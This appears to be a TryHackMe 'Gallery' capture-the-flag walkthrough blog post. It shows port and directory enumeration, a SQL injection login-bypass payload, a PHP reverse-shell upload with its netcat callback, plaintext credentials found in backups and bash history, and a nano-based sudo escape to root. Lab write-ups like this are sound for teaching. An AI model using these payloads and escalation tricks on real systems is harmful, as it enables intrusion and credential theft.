---
layout: post
title: "TryHackMe: Gallery"
categories: TryHackMe
published: true
---

![banner](/assets/pictures/tryhackme/gallery-banner.avif)

Greetings h4xors! We will dive into a vulnerable gallery system. Let's take a look.

## Reconnaissance

> nmap  -sC  -p-  -sV  $IP  -oN  nmap.txt  --vv

* -sC: This is the switch for scanning common vuln using common script
* -p-: This is the switch to scan all possible opened ports of 65535
* -sV: This is the switch for scanning the running services 
* -oN: This is the switch to output the result in TXT format.
* --vv: Advance verbose

```bash
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B009C743CE4AC3BD45EDD72E8C3E7E57
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Simple Image Gallery System

```
Based on the nmap scan result, there are 2 opened ports which are the same services, http. Now let's take a look one by one. Port 80 seems to have a default apache web page. However, upon enumerating the website using gobuster, I found a directory called `gallery`.

```bash
──(root㉿kali)-[~/THM/Gallery]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.53.141/      
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.53.141/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/08/12 11:16:52 Starting gobuster in directory enumeration mode
===============================================================
/gallery              (Status: 301) [Size: 314] [--> http://10.10.53.141/gallery/]
Progress: 7167 / 220561 (3.25%)
```

![cms](/assets/pictures/tryhackme/gallery1.png)

I quickly check for any SQL injection vulnerabily on this login page and successfuly bypass the login panel using this payload `"' or '1'='1'-- -"`. Upon checking the admin dashboard, I found the upload function that might be vulnerable to file upload restriction vulnerabilities. p/s: Look at the url parameter, it might be vulnerable to sqli too! 

![ss](/assets/pictures/tryhackme/gallery2.png)

---

## Gaining access

Now let's upload a reverse shell and setup netcat listener. Yup! It really vulnerable where I can upload a php reverse shell without changing a file extension to .jpg. The server did not filter uploaded files at all!

```bash
┌──(root㉿kali)-[~/THM/Gallery]
└─# nc -nlvp 9001                                     
listening on [any] 9001 ...
connect to [10.9.58.250] from (UNKNOWN) [10.10.53.141] 58084
Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 15:40:30 up 31 min,  0 users,  load average: 0.00, 0.00, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami; id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
I enumerated the machine to find for any juicy foothold and turns out Mike user have a backup directory in /var/backups/mike_home_backup/. There is a text file called `accounts.tx` that stored credentials.

```bash
$ cat documents/accounts.txt
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```
However, none of these passwords are true. It seems like I've jumped into a rabbit hole. Nevertheless, I found Mike's password inside the bash history file and successfully logged in as Mike!

---
## User's flag

```bash
www-data@gallery:/var/backups/mike_home_backup$ su mike
su mike
Password: b3stpassw0rdbr0xx

mike@gallery:/var/backups/mike_home_backup$ cd ~/
cd ~/
mike@gallery:~$ cat user.txt
cat user.txt
THM{afxxxxxxxxxxxxxxxx}
mike@gallery:~$ 
```
---
## Privilege escalation

```
User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

```

Mike can run sudo on rootkit.sh. Now let's examine the content of this file.

```sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

As you can see, the script will prompt and ask for three different inputs. If you take a look at the read case, the script will execute nano if we send `read` input. We can take advantage of this case by executing root shell inside of nano since the script can be run as root! 

Type CTRL + R and CTRL + X and execute this command in nano;
> reset; sh 1>&0 2>&0

```bash
# id; whoami
uid=0(root) gid=0(root) groups=0(root)
root
# cd /root; ls
report.txt  root.txt
# cat root.txt
THM{baxxxxxxxxxxxxxxxxxxxxx}
```

We got r00t!

---